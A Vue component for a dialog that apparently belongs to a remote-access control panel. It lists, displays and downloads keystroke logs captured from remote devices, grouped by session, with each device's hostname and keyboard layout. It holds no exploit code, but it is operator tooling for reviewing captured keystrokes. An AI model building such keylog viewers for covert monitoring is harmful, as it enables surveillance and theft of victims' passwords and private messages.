<template>
  <el-dialog
    :model-value="open"
    :title="`Keylog - [${device.conn ? device.conn.slice(0,8) : ''}] ${device.hostname} - layout: ${keyboardLayout}`"
    width="900px"
    draggable
    destroy-on-close
    @close="$emit('cancel')"
  >
    <el-tabs v-model="activeTab" @tab-change="onTabChange">

      <!-- ── Parsed / current session ─────────────────────────────────── -->
      <el-tab-pane label="Current Session" name="parsed">
        <div v-loading="parsedLoading" style="height:380px;overflow:auto">
          <el-alert v-if="parsedError" :title="parsedError" type="error" :closable="false" style="margin-bottom:8px" />
          <pre v-if="parsedData" style="white-space:pre-wrap;word-break:break-all;margin:0;font-size:13px">{{ parsedData }}</pre>
          <el-empty v-else-if="!parsedLoading && !parsedError" description="No keylog data for this session" />
        </div>
      </el-tab-pane>

      <!-- ── Raw files ────────────────────────────────────────────────── -->
      <el-tab-pane label="All Files" name="files">
        <div v-loading="filesLoading" style="min-height:120px">
          <el-alert v-if="filesError" :title="filesError" type="error" :closable="false" style="margin-bottom:8px" />
          <el-table v-else :data="files" size="small" stripe style="width:100%">
            <el-table-column prop="name" label="Filename" min-width="320" show-overflow-tooltip>
              <template #default="{ row }">
                <span :style="row.current ? 'font-weight:600;color:var(--el-color-primary)' : ''">
                  {{ row.name }}
                </span>
                <el-tag v-if="row.current" size="small" type="success" style="margin-left:6px">current</el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="session_id" label="Session" width="110">
              <template #default="{ row }">
                <span style="font-family:monospace;font-size:12px">{{ row.session_id.slice(0,8) }}</span>
              </template>
            </el-table-column>
            <el-table-column prop="size" label="Size" width="90" :formatter="(r) => formatSize(r.size)" />
            <el-table-column label="" width="130">
              <template #default="{ row }">
                <div style="display:flex;gap:4px">
                  <el-button size="small" @click="viewFile(row)">View</el-button>
                  <el-button size="small" type="primary" @click="downloadFile(row)">DL</el-button>
                </div>
              </template>
            </el-table-column>
          </el-table>
          <el-empty v-if="!filesLoading && !filesError && files.length === 0" description="No keylog files found" />
        </div>

        <!-- Inline raw viewer -->
        <div v-if="rawFile" style="margin-top:12px">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
            <span style="font-size:12px;color:#888;font-family:monospace">{{ rawFile.name }}</span>
            <el-button size="small" text @click="rawFile=null;rawContent=null">✕ Close</el-button>
          </div>
          <div v-loading="rawLoading" style="height:240px;overflow:auto;background:#1e1e1e;border-radius:4px;padding:8px">
            <pre v-if="rawContent != null" style="margin:0;color:#d4d4d4;font-size:12px;white-space:pre-wrap;word-break:break-all">{{ rawContent }}</pre>
          </div>
        </div>
      </el-tab-pane>

    </el-tabs>

    <template #footer>
      <el-button :icon="RefreshRight" @click="refreshActive">Refresh</el-button>
      <el-button @click="$emit('cancel')">Close</el-button>
    </template>
  </el-dialog>
</template>

<script>
import { ref, computed, onMounted } from 'vue';
import { RefreshRight } from '@element-plus/icons-vue';
import { request, formatSize } from '../api/request.js';

const LAYOUT_MAP = {
  1033:'us', 2057:'gb', 1031:'de', 1036:'fr', 1040:'it',
  1043:'nl', 1045:'pl', 1048:'ro', 1030:'da', 1032:'gr',
  1034:'es', 1035:'fi', 1038:'hu', 1044:'no', 1046:'pt',
  1049:'ru', 1050:'hr', 1051:'sk', 1053:'se', 1055:'tr',
  1059:'is', 1026:'bg', 1029:'cs', 1061:'et', 1060:'si',
};

export default {
  name: 'Keylog',
  props: {
    device: { type: Object, required: true },
    open:   { type: Boolean, default: false },
  },
  emits: ['cancel'],
  setup(props) {
    const activeTab = ref('parsed');

    // ── parsed tab ──────────────────────────────────────────────────────────
    const parsedLoading = ref(false);
    const parsedData    = ref(null);
    const parsedError   = ref(null);

    async function fetchParsed() {
      parsedLoading.value = true;
      parsedError.value   = null;
      parsedData.value    = null;
      try {
        const fd = new FormData();
        fd.append('uuid', props.device.conn);
        const res = await fetch('./api/device/keylog', { method: 'POST', body: fd });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const json = await res.json();
        parsedData.value = json?.data?.log || null;
      } catch (e) {
        parsedError.value = e.message;
      } finally {
        parsedLoading.value = false;
      }
    }

    // ── files tab ───────────────────────────────────────────────────────────
    const filesLoading = ref(false);
    const filesError   = ref(null);
    const files        = ref([]);
    const rawFile      = ref(null);
    const rawContent   = ref(null);
    const rawLoading   = ref(false);

    async function fetchFiles() {
      filesLoading.value = true;
      filesError.value   = null;
      rawFile.value      = null;
      rawContent.value   = null;
      try {
        const fd = new FormData();
        fd.append('uuid', props.device.conn);
        const res  = await fetch('./api/device/keylog/files', { method: 'POST', body: fd });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const json = await res.json();
        files.value = json?.data?.files ?? [];
        // Sort: current session first, then by name descending
        files.value.sort((a, b) => {
          if (a.current !== b.current) return a.current ? -1 : 1;
          return b.name.localeCompare(a.name);
        });
      } catch (e) {
        filesError.value = e.message;
      } finally {
        filesLoading.value = false;
      }
    }

    async function viewFile(row) {
      rawFile.value    = row;
      rawContent.value = null;
      rawLoading.value = true;
      try {
        const res = await fetch(`./api/device/keylog/download?file=${encodeURIComponent(row.name)}`);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        rawContent.value = await res.text();
      } catch (e) {
        rawContent.value = `Error: ${e.message}`;
      } finally {
        rawLoading.value = false;
      }
    }

    function downloadFile(row) {
      const a = document.createElement('a');
      a.href = `./api/device/keylog/download?file=${encodeURIComponent(row.name)}`;
      a.download = row.name;
      a.click();
    }

    // ── shared ──────────────────────────────────────────────────────────────
    const keyboardLayout = computed(() => {
      const raw  = props.device.keyboardlayout;
      const code = parseInt(raw, 10);
      if (!isNaN(code)) return LAYOUT_MAP[code] ?? code;
      return raw ?? 'unknown';
    });

    onMounted(() => {
      activeTab.value = 'parsed';
      fetchParsed();
    });

    function onTabChange(tab) {
      if (tab === 'parsed') fetchParsed();
      else if (tab === 'files') fetchFiles();
    }

    function refreshActive() {
      if (activeTab.value === 'parsed') fetchParsed();
      else fetchFiles();
    }

    return {
      activeTab, keyboardLayout,
      parsedLoading, parsedData, parsedError,
      filesLoading, filesError, files,
      rawFile, rawContent, rawLoading,
      RefreshRight, formatSize,
      onTabChange, refreshActive,
      viewFile, downloadFile,
    };
  },
};
</script>
